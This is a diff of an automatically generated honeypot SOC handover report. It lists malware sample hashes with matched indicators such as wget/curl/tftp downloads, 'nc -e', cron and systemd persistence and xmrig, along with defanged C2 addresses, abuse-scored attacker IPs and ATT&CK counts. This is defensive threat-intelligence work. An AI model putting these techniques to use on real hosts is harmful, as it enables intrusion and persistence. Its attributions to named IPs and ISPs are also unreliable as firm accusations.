-- `chmod +x (make executable)` — `chmod +x`
-
-_`e0e21cf140a749c8b5a192067c7d57bec0ca935c5cfbd600bc4e8f6dbb2416a9` (e0e21cf140a749c8b5a19206...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`e27e963b2b49cc758ddd65456d335d0183ca9ddc54349494d6a9f49d7c0603f4` (e27e963b2b49cc758ddd6545...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-- `Crypto miner binary` — `xmrig`
-
-_`e479462010c2514b9fa8513bbd3d515fe665d58d6514f7e78411131ff3090ed9` (e479462010c2514b9fa8513b...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/.sshd`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Hardware recon` — `cat /proc/cpuinfo`
-- `IP:Port (possible C2)` — `91.199.133[.]133:8080`
-
-_`e48278fbe3d856e7c8e337eb92c75044bd2c36edb467a40b19d4830d0fd47357` (e48278fbe3d856e7c8e337eb...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Hardware recon` — `cat /proc/cpuinfo`
-
-_`e60956d9926d18dad03ca3fdf71dfe8e1ac47300c8fe12a4248354c60fbfba66` (e60956d9926d18dad03ca3fd...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Netcat listener/exec` — `nc -e`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-
-_`e7ffadca7485550fa00a049f12f3e7e957f7fc19dae3229927af7cc39b13ba46` (e7ffadca7485550fa00a049f...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
-_`ec69d3e0d4d9e797c2942cd2aa177b269db94edf5bd104d7a8eb2ecc73029b4c` (ec69d3e0d4d9e797c2942cd2...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-- `Crypto miner binary` — `xmrig`
-
-_`eff4cbad70d1a0cbf9c296ebb2ea16e25cf52cb961b278501081bd6a376f1652` (eff4cbad70d1a0cbf9c296eb...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`f1bed76655cc8cce9ee9ac2857fed6b6cf1eb6a6d5446ae8144b6529d07ddf77` (f1bed76655cc8cce9ee9ac28...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`f29c23e3ce0a393d9cd5927b4873e8b9a4a8800e4a1270abfd8f279ae4041729` (f29c23e3ce0a393d9cd5927b...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`fab1754a61b7e16bb69883e2956615c2de9ec8b88fb265532ab71a5c8eedf4c4` (fab1754a61b7e16bb69883e2...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Execution from /tmp` — `/tmp/bot`
-- `chmod +x (make executable)` — `chmod +x`
-- `Cron persistence` — `crontab`
-- `RC script persistence` — `/etc/rc.`
-- `Systemd persistence` — `systemctl enable`
-- `IP:Port (possible C2)` — `64.89.161[.]96:55487`
-
-_`fd777ba283a28723e0634c7679224680b8499d438c885a755ebda8011fbf466a` (fd777ba283a28723e0634c76...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `chmod +x (make executable)` — `chmod +x`
-
-_`ff0505f010971ddaa354ff717283644d446b6ae27bd9f8ce2ff4a7ea575d3d18` (ff0505f010971ddaa354ff71...)_
-- `Download via wget` — `wget`
-- `Download via curl` — `curl`
-- `Download via TFTP` — `tftp`
-- `Download via ftpget` — `ftpget`
-- `Execution from /tmp` — `/tmp/condi`
-- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
-
 ---
 
 ## 🌐 Top Attacker IPs by Abuse Score
 
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
-| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
-| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
-| `82.147.85[.]98` | RU | Siberian Telecommunications Ltd. | **100** ⚠️ | 41 |
 | `78.128.112[.]74` | BG | Lir.bg EOOD | **100** ⚠️ | 50 |
-| `45.135.194[.]92` | DE | Pfcloud UG | **100** ⚠️ | 6 |
-| `80.94.92[.]234` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
-| `103.78.1[.]160` | VN | ROYAL TECHNOLOGY MEDIA JOINT STOCK COMPANY | **100** ⚠️ | 18 |
-| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
-| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 50 |
-| `177.38.21[.]245` | BR | MAX TELECOM PROVEDOR DE ACESSO A INTERNET LTDA | **100** ⚠️ | 3 |
+| `40.67.165[.]94` | US | Microsoft Corporation | **100** ⚠️ | 5 |
+| `66.132.186[.]181` | US | Censys, Inc. | **100** ⚠️ | 50 |
+| `118.121.202[.]149` | CN | CHINANET Sichuan province network | **100** ⚠️ | 44 |
+| `130.12.181[.]21` | SI | Netiface LLC | **100** ⚠️ | 21 |
+| `59.28.174[.]77` | KR | Korea Telecom | **100** ⚠️ | 36 |
+| `165.154.6[.]112` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 28 |
+| `185.230.216[.]5` | GB | World4You Internet Services GmbH | **100** ⚠️ | 18 |
+| `185.233.3[.]95` | KZ | Mws Cloud, Limited Liability Company | **100** ⚠️ | 50 |
+| `114.217.10[.]60` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
 
 ---
 
@@ -2857,27 +1466,29 @@ _`ff0505f010971ddaa354ff717283644d446b6ae27bd9f8ce2ff4a7ea575d3d18` (ff0505f0109
 
 | TTP ID | Count |
 |---|---|
-| [T1592](https://attack.mitre.org/techniques/T1592) | 62 |
-| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
-| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |
-| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
-| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 310 |
+| [T1078](https://attack.mitre.org/techniques/T1078) | 304 |
+| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 120 |
+| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
+| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |
 
 ---
 
-## 🔕 False Positive Summary (26 filtered)
+## 🔕 False Positive Summary (70 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 7 |
+| AbuseIPDB score 0 below threshold 25 | 24 |
 | AbuseIPDB score 1 below threshold 25 | 3 |
-| AbuseIPDB score 11 below threshold 25 | 2 |
-| AbuseIPDB score 12 below threshold 25 | 1 |
-| AbuseIPDB score 16 below threshold 25 | 2 |
-| AbuseIPDB score 23 below threshold 25 | 2 |
+| AbuseIPDB score 11 below threshold 25 | 3 |
+| AbuseIPDB score 12 below threshold 25 | 5 |
+| AbuseIPDB score 16 below threshold 25 | 4 |
+| AbuseIPDB score 18 below threshold 25 | 1 |
+| AbuseIPDB score 21 below threshold 25 | 4 |
+| AbuseIPDB score 23 below threshold 25 | 3 |
 | AbuseIPDB score 24 below threshold 25 | 4 |
-| AbuseIPDB score 7 below threshold 25 | 1 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |
+| AbuseIPDB score 5 below threshold 25 | 2 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -2888,19 +1499,19 @@ _`ff0505f010971ddaa354ff717283644d446b6ae27bd9f8ce2ff4a7ea575d3d18` (ff0505f0109
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 113 cases |
-| Tool 34  | Credential Extractor        | ✅ 963 attempts |
-| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
-| Tool 36  | Command Clustering          | ✅ 15 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 26 filtered (23.0%) |
+| Tool 26  | Incident Timeline Generator | ✅ 493 cases |
+| Tool 34  | Credential Extractor        | ✅ 3339 attempts |
+| Tool 35  | SSH Fingerprint Aggregator  | ✅ 35 fingerprints |
+| Tool 36  | Command Clustering          | ✅ 133 clusters |
+| Tool 27  | Threat Intel Feeder         | ✅ 198 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 70 filtered (14.2%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
-| Tool 31  | Malware Analyzer            | ✅ 871 files |
-| Tool 33  | YARA Classifier             | ✅ 339 classified |
+| Tool 30b | ASN Clustering              | ✅ 94 ASNs |
+| Tool 31  | Malware Analyzer            | ✅ 49 files |
+| Tool 33  | YARA Classifier             | ✅ 39 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
 
-> **Report grouping:** 54 priority case(s) shown individually · 29 recon entry/entries in table (4 group(s) consolidating 8 session(s)).
+> **Report grouping:** 291 priority case(s) shown individually · 114 recon entry/entries in table (12 group(s) consolidating 30 session(s)).
 
 ---
 
@@ -2935,4 +1546,4 @@ _`ff0505f010971ddaa354ff717283644d446b6ae27bd9f8ce2ff4a7ea575d3d18` (ff0505f0109
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
-_Report time: 2026-11-19T05:02:37Z_
+_Report time: 2026-11-19T19:47:03Z_
